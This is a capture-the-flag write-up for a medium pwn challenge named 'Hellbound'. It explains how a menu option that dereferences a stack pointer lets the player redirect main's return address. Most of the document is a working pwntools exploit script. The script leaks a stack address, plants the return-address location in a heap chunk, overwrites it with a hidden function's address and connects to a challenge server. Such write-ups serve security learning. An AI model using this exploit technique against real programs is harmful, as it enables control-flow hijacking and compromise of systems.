# Hellbound

```
score: 325
solved: 127
difficulty: medium
tags: pwn, rop
```

## Identify
Have 1 array pointer `local_50` to save data. Firstly, `local_50[0]` point to pointer of new chunk.
we have 4 options:
- 1 - Print pointer of `local_50`
- 2 - Write data to `local_50[0]`
- 3 - `local_50[0] = *(void **)((long)local_50[0] + 8);`
- 69 - `free(local_50[0])` and quit

We can use the option 3 to modfy the `return value` of `main` function because `local_50` is in main's stack frame.

## Exploit
<mark>**Note:**</mark> Set `local_50[0]` to `\x00` for no bug occus when run `free`.
```python
from pwn import *
import re
import time

s = '''
init-gef
b *0x00400cf4
b *0x00400d86
b *0x00400db6
"b *0x00400d7f
'''

exe = ELF("./hellhound")
# p = process(exe.path)
# p = gdb.debug(exe.path,gdbscript = s)
# time.sleep(2)
p = remote("188.166.172.138",30830)

# Leak address of pointer 
p.sendafter(b">> ", b"1\n")
tmp = p.recvuntil(b">> ")
num = int(re.search(b'\[[0-9]+?\]',tmp).group(0)[1:-1])
log.info(repr(hex(num)))
p.send(b"1\n")

ret_stack = num + 0x50

# Write addr of return on stack to chunk:
p.sendafter(b">> ",b"2\n")
p.sendafter(b"code: ",b"\x00"*8 + p64(ret_stack))
time.sleep(0.5)
p.sendafter(b">> ",b"3\n")

# Override return addr with function :
log.info("Override ret addr")
p.sendafter(b">> ", b"2\n")
payload = p64(exe.symbols.berserk_mode_off)
payload += p64(0)
payload += p64(0)
payload += p64(0)
p.sendafter(b"code: ", payload)
time.sleep(0.5)
p.sendafter(b">> ", b"3\n")
p.sendafter(b">> ", b"69\n")

p.interactive()
```